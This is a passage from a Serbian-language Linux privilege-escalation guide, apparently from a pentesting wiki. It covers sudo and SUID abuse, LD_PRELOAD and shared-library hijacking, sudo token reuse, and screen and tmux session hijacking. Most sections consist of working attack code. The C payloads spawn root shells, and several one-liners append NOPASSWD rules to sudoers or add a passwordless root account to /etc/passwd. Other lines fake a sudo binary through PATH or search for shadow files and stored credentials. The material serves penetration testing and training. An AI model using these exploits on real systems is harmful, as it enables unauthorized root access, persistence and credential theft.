**Exploit it** koristeći: **`systemd-run -t /bin/bash`**

### Groups

Proveri da li si **član neke grupe** koja bi ti mogla dodeliti root privilegije:


{{#ref}}
interesting-groups-linux-pe/
{{#endref}}

### Clipboard

Proveri da li se u međuspremniku nalazi nešto interesantno (ako je moguće)
```bash
if [ `which xclip 2>/dev/null` ]; then
echo "Clipboard: "`xclip -o -selection clipboard 2>/dev/null`
echo "Highlighted text: "`xclip -o 2>/dev/null`
elif [ `which xsel 2>/dev/null` ]; then
echo "Clipboard: "`xsel -ob 2>/dev/null`
echo "Highlighted text: "`xsel -o 2>/dev/null`
else echo "Not found xsel and xclip"
fi
```
### Politika lozinki
```bash
grep "^PASS_MAX_DAYS\|^PASS_MIN_DAYS\|^PASS_WARN_AGE\|^ENCRYPT_METHOD" /etc/login.defs
```
### Poznate lozinke

Ako **znate bilo koju lozinku** iz okruženja, **pokušajte da se prijavite kao svaki korisnik** koristeći tu lozinku.

### Su Brute

Ako vam ne smeta stvaranje puno buke i `su` i `timeout` binariji su prisutni na računaru, možete pokušati da brute-force-ujete korisnika koristeći [su-bruteforce](https://github.com/carlospolop/su-bruteforce).\
[**Linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) sa `-a` parametrom takođe pokušava brute-force-ovati korisnike.

## Zlouporabe upisivog PATH-a

### $PATH

Ako otkrijete da možete **pisati u neku fasciklu iz $PATH-a**, možda ćete moći eskalirati privilegije kreiranjem **backdoor-a unutar upisive fascikle** pod imenom neke komande koja će biti izvršena od strane drugog korisnika (po mogućstvu root) i koja se **ne učitava iz fascikle koja se nalazi pre** vaše upisive fascikle u $PATH-u.

### SUDO and SUID

Možda vam je dozvoljeno da izvršite neku komandu koristeći sudo ili ta komanda može imati suid bit. Proverite to koristeći:
```bash
sudo -l #Check commands you can execute with sudo
find / -perm -4000 2>/dev/null #Find all SUID binaries
```
Neke **neočekivane komande omogućavaju da čitate i/ili pišete fajlove ili čak izvršite komandu.** Na primer:
```bash
sudo awk 'BEGIN {system("/bin/sh")}'
sudo find /etc -exec sh -i \;
sudo tcpdump -n -i lo -G1 -w /dev/null -z ./runme.sh
sudo tar c a.tar -I ./runme.sh a
ftp>!/bin/sh
less>! <shell_comand>
```
### NOPASSWD

Sudo konfiguracija može omogućiti korisniku da izvrši neku komandu sa privilegijama drugog korisnika bez poznavanja lozinke.
```
$ sudo -l
User demo may run the following commands on crashlab:
(root) NOPASSWD: /usr/bin/vim
```
U ovom primeru korisnik `demo` može da pokrene `vim` kao `root`; sada je trivijalno dobiti shell dodavanjem ssh ključa u `root` direktorijum ili pozivanjem `sh`.
```
sudo vim -c '!sh'
```
### SETENV

Ova direktiva omogućava korisniku da **set an environment variable** tokom izvršavanja nečega:
```bash
$ sudo -l
User waldo may run the following commands on admirer:
(ALL) SETENV: /opt/scripts/admin_tasks.sh
```
Ovaj primer, **based on HTB machine Admirer**, je bio **ranjiv** na **PYTHONPATH hijacking** da učita proizvoljnu python biblioteku dok se skripta izvršavala kao root:
```bash
sudo PYTHONPATH=/dev/shm/ /opt/scripts/admin_tasks.sh
```
### BASH_ENV preserved via sudo env_keep → root shell

If sudoers preserves `BASH_ENV` (e.g., `Defaults env_keep+="ENV BASH_ENV"`), you can leverage Bash’s non-interactive startup behavior to run arbitrary code as root when invoking an allowed command.

- Why it works: Za neinteraktivne shelove, Bash procenjuje `$BASH_ENV` i učitava (sources) taj fajl pre nego što pokrene ciljni skript. Mnoge sudo politike dozvoljavaju pokretanje skripte ili shell wrapper-a. Ako sudo sačuva `BASH_ENV`, vaš fajl će biti učitan sa root privilegijama.

- Requirements:
- sudo pravilo koje možete pokrenuti (bilo koji cilj koji poziva `/bin/bash` neinteraktivno, ili bilo koja bash skripta).
- `BASH_ENV` prisutan u `env_keep` (proverite sa `sudo -l`).

- PoC:
```bash
cat > /dev/shm/shell.sh <<'EOF'
#!/bin/bash
/bin/bash
EOF
chmod +x /dev/shm/shell.sh
BASH_ENV=/dev/shm/shell.sh sudo /usr/bin/systeminfo   # or any permitted script/binary that triggers bash
# You should now have a root shell
```
- Ojačavanje:
- Uklonite `BASH_ENV` (i `ENV`) iz `env_keep`, radije koristite `env_reset`.
- Izbegavajte shell wrappers za sudo-allowed commands; koristite minimalne binarne.
- Razmotrite sudo I/O logging i alertiranje kada se koriste sačuvane env vars.

### Putevi za zaobilaženje sudo izvršavanja

**Jump** da pročitate druge fajlove ili koristite **symlinks**. Na primer u sudoers fajlu: _hacker10 ALL= (root) /bin/less /var/log/\*_
```bash
sudo less /var/logs/anything
less>:e /etc/shadow #Jump to read other files using privileged less
```

```bash
ln /etc/shadow /var/log/new
sudo less /var/log/new #Use symlinks to read any file
```
Ako se koristi **wildcard** (\*), to je još lakše:
```bash
sudo less /var/log/../../etc/shadow #Read shadow
sudo less /var/log/something /etc/shadow #Red 2 files
```
**Protivmere**: [https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/](https://blog.compass-security.com/2012/10/dangerous-sudoers-entries-part-5-recapitulation/)

### Sudo command/SUID binary bez putanje komande

Ako je korisniku dodeljena **sudo dozvola** za jednu komandu **bez navođenja putanje**: _hacker10 ALL= (root) less_ možete to iskoristiti menjajući promenljivu PATH
```bash
export PATH=/tmp:$PATH
#Put your backdoor in /tmp and name it "less"
sudo less
```
Ova tehnika se takođe može koristiti ako **suid** binarni fajl **pokreće neku drugu komandu bez navođenja puta do nje (uvek proverite koristeći** _**strings**_ **sadržaj čudnog SUID binarnog fajla)**.

[Payload examples to execute.](payloads-to-execute.md)

### SUID binarni fajl sa putanjom komande

Ako **suid** binarni fajl **pokreće drugu komandu navodeći putanju**, onda možete pokušati da **export a function** nazvanu kao komanda koju suid fajl poziva.

Na primer, ako suid binarni fajl poziva _**/usr/sbin/service apache2 start**_ morate pokušati da kreirate funkciju i export it:
```bash
function /usr/sbin/service() { cp /bin/bash /tmp && chmod +s /tmp/bash && /tmp/bash -p; }
export -f /usr/sbin/service
```
Zatim, kada pozovete suid binarni fajl, ova funkcija će biti izvršena

### LD_PRELOAD & **LD_LIBRARY_PATH**

The **LD_PRELOAD** environment variable is used to specify one or more shared libraries (.so files) to be loaded by the loader before all others, including the standard C library (`libc.so`). This process is known as preloading a library.

Međutim, da bi se održala bezbednost sistema i sprečilo zloupotrebljavanje ove funkcije, naročito kod **suid/sgid** izvršnih fajlova, sistem nameće određene uslove:

- Loader ignoriše **LD_PRELOAD** za izvršne fajlove gde realni user ID (_ruid_) ne odgovara efektivnom user ID (_euid_).
- Za izvršne fajlove sa **suid/sgid**, preucitavaju se samo biblioteke koje se nalaze u standardnim putanjama i koje su takođe **suid/sgid**.

Privilege escalation can occur if you have the ability to execute commands with `sudo` and the output of `sudo -l` includes the statement **env_keep+=LD_PRELOAD**. This configuration allows the **LD_PRELOAD** environment variable to persist and be recognized even when commands are run with `sudo`, potentially leading to the execution of arbitrary code with elevated privileges.
```
Defaults        env_keep += LD_PRELOAD
```
Sačuvajte kao **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim **kompajlirajte ga** koristeći:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na kraju, **escalate privileges** izvršavanjem
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Sličan privesc može se zloupotrebiti ako napadač kontroliše **LD_LIBRARY_PATH** env variable, jer on kontroliše putanju na kojoj će se biblioteke tražiti.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Kada naiđete na binary sa **SUID** privilegijama koji deluje neobično, dobra je praksa proveriti da li ispravno učitava **.so** fajlove. Ovo se može proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, nailazak na grešku kao što je _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ ukazuje na potencijal za exploitation.

Da biste exploit-ovali ovo, kreirajte C fajl, npr. _"/path/to/.config/libcalc.c"_, koji sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Овај код, када се компајлира и изврши, има за циљ да повећа привилегије манипулацијом дозвола фајлова и покретањем shell-а са повишеним привилегијама.

Компајлирајте горе наведени C фајл у shared object (.so) фајл помоћу:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Na kraju, pokretanje pogođenog SUID binary-ja trebalo bi da pokrene exploit, omogućavajući potencijalno kompromitovanje sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binary koji učitava biblioteku iz direktorijuma u koji možemo pisati, napravimo biblioteku u tom direktorijumu sa potrebnim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku kao što je
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znači da biblioteka koju ste generisali mora da sadrži funkciju nazvanu `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je kurirana lista Unix binarnih fajlova koji se mogu iskoristiti od strane napadača da bi zaobišli lokalna bezbednosna ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto, ali za slučajeve kada možete **samo ubaciti argumente** u komandu.

Projekat prikuplja legitimne funkcije Unix binarnih fajlova koje se mogu zloupotrebiti da bi se izašlo iz ograničenih shell-ova, eskalirali ili održali povišeni privilegiji, prenosili fajlovi, pokretali bind i reverse shells, i olakšali drugi post-exploitation zadaci.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ako možete da pokrenete `sudo -l` možete koristiti alat [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li pronalazi način da iskoristi bilo koje sudo pravilo.

### Reusing Sudo Tokens

U slučajevima kada imate **sudo access** ali nemate lozinku, možete eskalirati privilegije tako što ćete **sačekati izvršenje sudo komande i zatim oteti session token**.

Zahtevi za eskalaciju privilegija:

- Već imate shell kao korisnik _sampleuser_
- _sampleuser_ je **koristio `sudo`** da izvrši nešto u **poslednjih 15mins** (po defaultu to je trajanje sudo tokena koje nam omogućava da koristimo `sudo` bez unošenja lozinke)
- `cat /proc/sys/kernel/yama/ptrace_scope` je 0
- `gdb` je dostupan (možete ga otpremiti)

(Možete privremeno omogućiti `ptrace_scope` sa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno modifikovanjem `/etc/sysctl.d/10-ptrace.conf` i postavljanjem `kernel.yama.ptrace_scope = 0`)

Ako su svi ovi zahtevi ispunjeni, **možete eskalirati privilegije koristeći:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- Prvi exploit (`exploit.sh`) će kreirati binarni fajl `activate_sudo_token` u _/tmp_. Možete ga koristiti da **aktivirate sudo token u vašoj sesiji** (nećete automatski dobiti root shell, pokrenite `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Drugi **exploit** (`exploit_v2.sh`) će kreirati sh shell u _/tmp_ **u vlasništvu root-a sa setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Treći exploit** (`exploit_v3.sh`) će **napraviti sudoers file** koji čini **sudo tokens večnim i omogućava svim korisnicima da koriste sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/<Username>

Ako imate **write permissions** u folderu ili na bilo kojoj od datoteka kreiranim unutar foldera, možete koristiti binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da **create a sudo token for a user and PID**.\
Na primer, ako možete prepisati fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj user sa PID 1234, možete **obtain sudo privileges** bez potrebe да znate lozinku tako što ćete:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Fajl `/etc/sudoers` i fajlovi unutar `/etc/sudoers.d` konfigurišu ko može da koristi `sudo` i kako. Ove datoteke **podrazumevano se mogu čitati samo od strane korisnika root i grupe root**.\
**Ako** možete **pročitati** ovu datoteku, mogli biste dobiti **neke interesantne informacije**, a ako možete **pisati** u bilo koju datoteku bićete u mogućnosti da **eskalirate privilegije**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako možeš da pišeš, možeš zloupotrebiti ovu dozvolu.
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Još jedan način zloupotrebe ovih dozvola:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje neke alternative za binarni fajl `sudo`, kao što je `doas` za OpenBSD; zapamtite da proverite njegovu konfiguraciju u `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ako znate da se **korisnik se obično povezuje na mašinu i koristi `sudo`** da eskalira privilegije i dobili ste shell u tom korisničkom kontekstu, možete **napraviti novi sudo executable** koji će izvršiti vaš kod kao root, a zatim komandu korisnika. Zatim, **izmenite $PATH** u korisničkom kontekstu (na primer dodavanjem novog puta u .bash_profile) tako da kada korisnik pokrene sudo, vaš sudo executable bude izvršen.

Obratite pažnju da ako korisnik koristi drugačiji shell (ne bash) moraćete da izmenite druge fajlove da biste dodali novi put. Na primer[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) menja `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Drugi primer možete pronaći u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokretanjem nečeg poput:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Deljena biblioteka

### ld.so

Fajl `/etc/ld.so.conf` označava **odakle dolaze učitane konfiguracione datoteke**. Obično ovaj fajl sadrži sledeću putanju: `include /etc/ld.so.conf.d/*.conf`

To znači da će konfiguracione datoteke iz `/etc/ld.so.conf.d/*.conf` biti učitane. Te konfiguracione datoteke **pokazuju na druge foldere** u kojima će se **biblioteke** **tražiti**. Na primer, sadržaj `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem tražiti biblioteke u okviru `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima dozvolu za pisanje** na bilo kojoj od navedenih putanja: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo kojoj datoteci u okviru `/etc/ld.so.conf.d/` ili bilo kojem folderu koji je naveden u konfiguracionim fajlovima iz `/etc/ld.so.conf.d/*.conf` možda će moći da poveća privilegije.\
Pogledajte **kako iskoristiti ovu pogrešnu konfiguraciju** na sledećoj stranici:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiranjem lib u `/var/tmp/flag15/`, program će ga koristiti na toj lokaciji, kako je navedeno u promenljivoj `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim kreirajte zlonamernu biblioteku u `/var/tmp` pomoću `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities pružaju **podskup dostupnih root privilegija procesu**. Ovo efikasno deli root **privilegije na manje i odvojene jedinice**. Svaka od ovih jedinica može biti nezavisno dodeljena procesima. Na taj način se celokupan skup privilegija smanjuje, čime se umanjuju rizici od exploitatacije.\
Pročitajte sledeću stranu da biste **saznali više o capabilities i kako ih zloupotrebljavati**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

U direktorijumu, **bit za "execute"** podrazumeva da pogođeni korisnik može "**cd**" u folder.\
**Bit "read"** podrazumeva da korisnik može **list** **files**, a **bit "write"** podrazumeva da korisnik može **delete** i **create** nove **files**.

## ACLs

Access Control Lists (ACLs) predstavljaju sekundarni sloj diskrecionih dozvola, sposoban da **nadjača tradicionalne ugo/rwx permissions**. Ove dozvole poboljšavaju kontrolu pristupa fajlovima ili direktorijumima tako što omogućavaju ili uskraćuju prava specifičnim korisnicima koji nisu vlasnici niti deo grupe. Ovaj nivo **granularnosti obezbeđuje preciznije upravljanje pristupom**. Dalje informacije mogu se naći [**here**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dodeli** korisniku "kali" dozvole za čitanje i pisanje nad fajlom:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Dobavi** fajlove sa određenim ACLs iz sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Otvorene shell sessions

U **starijim verzijama** možete **hijack** neku **shell** sesiju drugog korisnika (**root**).\
U **najnovijim verzijama** moći ćete da se **connect** na screen sessions samo svog **korisnika**. Međutim, možete pronaći **zanimljive informacije unutar sesije**.

### screen sessions hijacking

**Prikaži screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
![](<../../images/image (141).png>)

**Priključi se na sesiju**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## tmux sessions hijacking

Ovo je bio problem sa **old tmux versions**. Nisam uspeo da hijack-ujem tmux (v2.1) session koji je kreirao root kao neprivilegovan korisnik.

**List tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Priključite se sesiji**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Svi SSL i SSH ključevi generisani na sistemima zasnovanim na Debianu (Ubuntu, Kubuntu, itd.) između septembra 2006. i 13. maja 2008. mogu biti pogođeni ovim bagom.\
Ovaj bag nastaje prilikom kreiranja novog ssh ključa na tim OS-ovima, jer je bilo moguće samo **32,768 varijacija**. To znači da se sve mogućnosti mogu izračunati i da, **posedujući ssh public key možete potražiti odgovarajući private key**. Izračunate mogućnosti možete pronaći ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Zanimljive vrednosti konfiguracije

- **PasswordAuthentication:** Specifikuje da li je autentifikacija lozinkom dozvoljena. Podrazumevano je `no`.
- **PubkeyAuthentication:** Specifikuje da li je autentifikacija pomoću javnog ključa dozvoljena. Podrazumevano je `yes`.
- **PermitEmptyPasswords**: Kada je autentifikacija lozinkom dozvoljena, specificira da li server dozvoljava prijavu na naloge sa praznim lozinkama. Podrazumevano je `no`.

### PermitRootLogin

Specifikuje da li se root može prijaviti koristeći ssh, podrazumevano je `no`. Moguće vrednosti:

- `yes`: root može da se prijavi koristeći lozinku i private key
- `without-password` ili `prohibit-password`: root se može prijaviti samo pomoću private key
- `forced-commands-only`: Root se može prijaviti samo pomoću private key i samo ako su specificirane opcije commands
- `no`: ne

### AuthorizedKeysFile

Specifikuje fajlove koji sadrže public keys koji mogu da se koriste za korisničku autentifikaciju. Može sadržati tokene poput `%h`, koji će biti zamenjeni home direktorijumom. **Možete navesti apsolutne putanje** (počevši sa `/`) ili **relativne putanje u odnosu na korisnički home**. Na primer:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracija će ukazati da ako pokušate da se prijavite pomoću **private** ključa korisnika "**testusername**", ssh će uporediti javni ključ vašeg ključa sa onima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding omogućava vam da **koristite svoje lokalne SSH ključeve umesto da ostavljate ključeve** (without passphrases!) na vašem serveru. Dakle, moći ćete da **se povežete** putem ssh **na jedan host** i odatle da **se povežete na drugi** host **koristeći** **ključ** koji se nalazi na vašem **početnom hostu**.

Treba da postavite ovu opciju u `$HOME/.ssh.config` ovako:
```
Host example.com
ForwardAgent yes
```
Obratite pažnju da ako je `Host` podešen na `*`, svaki put kada korisnik pređe na drugu mašinu, ta mašina će moći da pristupi ključevima (što predstavlja bezbednosni problem).

Fajl `/etc/ssh_config` može **nadjačati** ove **opcije** i dozvoliti ili zabraniti ovu konfiguraciju.\
Fajl `/etc/sshd_config` može pomoću ključne reči `AllowAgentForwarding` **dozvoliti** ili **zabrani­ti** ssh-agent forwarding (podrazumevano je dozvoljeno).

Ako otkrijete da je Forward Agent konfigurisan u okruženju, pročitajte sledeću stranicu jer **možda možete zloupotrebiti to za eskalaciju privilegija**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Zanimljivi fajlovi

### Fajlovi profila

Fajl `/etc/profile` i fajlovi ispod `/etc/profile.d/` su **skripte koje se izvršavaju kada korisnik pokrene novu shell**. Stoga, ako možete **pisati ili izmeniti bilo koji od njih, možete eskalirati privilegije**.
```bash
ls -l /etc/profile /etc/profile.d/
```
Ako se pronađe neka čudna skripta profila, treba je proveriti zbog **osetljivih detalja**.

### Datoteke passwd/shadow

U zavisnosti od OS-a, datoteke `/etc/passwd` i `/etc/shadow` mogu imati drugačije ime ili može postojati backup. Zato se preporučuje da **pronađete sve** i **proverite da li možete da ih pročitate** kako biste videli **da li se u datotekama nalaze hashes**:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
U nekim slučajevima možete pronaći **hashove lozinki** u fajlu `/etc/passwd` (ili odgovarajućem fajlu)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Upisljiv /etc/passwd

Prvo, generišite lozinku pomoću jedne od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Zatim dodajte korisnika `hacker` i unesite generisanu lozinku.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Npr: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete koristiti komandu `su` sa `hacker:hacker`

Alternativno, možete koristiti sledeće linije da dodate lažnog korisnika bez lozinke.\
UPOZORENJE: ovo može narušiti trenutnu bezbednost mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NAPOMENA: Na BSD platformama `/etc/passwd` se nalazi na `/etc/pwd.db` i `/etc/master.passwd`, takođe `/etc/shadow` je preimenovan u `/etc/spwd.db`.

Treba da proverite da li možete da **pišete u neke osetljive fajlove**. Na primer, da li možete da pišete u neki **konfiguracioni fajl servisa**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na primer, ako mašina pokreće **tomcat** server i možete **izmeniti datoteku konfiguracije servisa Tomcat u /etc/systemd/,** onda možete изmeniti linije:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Your backdoor će se izvršiti sledeći put kada se tomcat pokrene.

### Proverite foldere

Sledeće fascikle mogu sadržavati backups ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećete moći da pročitate poslednji, ali pokušajte)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Neobična lokacija/Owned files
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Izmenjene datoteke u poslednjih nekoliko minuta
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB datoteke
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fajlovi
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Skriveni fajlovi
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Skripte/Binarni fajlovi u PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web fajlovi**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Rezervne kopije**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznate datoteke koje sadrže lozinke

Pročitajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on pretražuje **nekoliko datoteka koje bi mogle sadržavati lozinke**.\
**Još jedan zanimljiv alat** koji možete koristiti za to je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) koja je open-source aplikacija koja služi za izvlačenje velikog broja lozinki pohranjenih na lokalnom računaru za Windows, Linux & Mac.

### Logovi

Ako možete čitati logove, mogli biste pronaći **zanimljive/poverljive informacije u njima**.\
